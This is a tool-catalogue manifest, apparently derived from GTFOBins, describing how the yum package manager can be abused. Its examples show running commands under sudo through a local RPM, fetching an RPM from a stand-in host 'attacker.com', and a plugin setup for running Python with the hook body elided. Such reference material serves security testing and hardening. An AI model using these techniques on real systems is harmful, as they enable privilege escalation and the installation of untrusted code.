---
id: package-yum-yum
namespace: package:yum:yum
name: yum
description: Yellowdog Updater Modified package manager; can execute arbitrary commands
  and spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- yum
parameters: []
features:
- interactive
- network-intensive
- pipes-stdin
- process-manip
execution:
  template: yum
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute arbitrary commands (sudo)
  command: yum localinstall -y x-1.0-1.noarch.rpm
- description: Download files (sudo)
  command: yum install http://attacker.com/path/to/input-file.rpm
- description: Leverage python capabilities
  command: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\n\
    pluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n\
    [main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins\
    \ import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\n\
    def init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/yum/
techniques:
- execution
- collection
install:
- method: apt
  package_name: yum
  commands:
  - apt-get install -y yum
---

# yum

yum is a command-line utility. Yellowdog Updater Modified package manager; can also execute arbitrary commands, download files Can also leverage capabilities from: python.
